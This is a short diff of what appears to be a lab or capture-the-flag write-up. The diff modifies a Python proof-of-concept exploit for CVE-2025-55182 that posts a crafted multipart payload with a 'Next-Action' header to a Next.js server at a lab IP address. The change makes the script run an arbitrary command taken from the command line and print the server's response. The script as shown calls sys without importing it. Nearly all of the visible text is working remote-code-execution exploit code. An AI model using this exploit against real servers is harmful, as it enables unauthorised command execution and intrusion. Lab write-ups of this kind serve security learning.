@@ -836,7 +836,7 @@ The PoC published by msanft at https://github.com/msanft/CVE-2025-55182 was sele
 import requests, json, re, base64
 
 BASE_URL = "http://10.129.13.245:3000/"
-CMD = "id"
+CMD = sys.argv[1]
 
 b64_cmd = base64.b64encode(CMD.encode()).decode()
 js_prefix = f"""
@@ -859,6 +859,8 @@ crafted_chunk = {
 files = {"0": (None, json.dumps(crafted_chunk)), "1": (None, '"$@0"')}
 headers = {"Next-Action": "x"}
 response = requests.post(BASE_URL, files=files, headers=headers)
+
+print(response.text)
 ```
 
 ```python
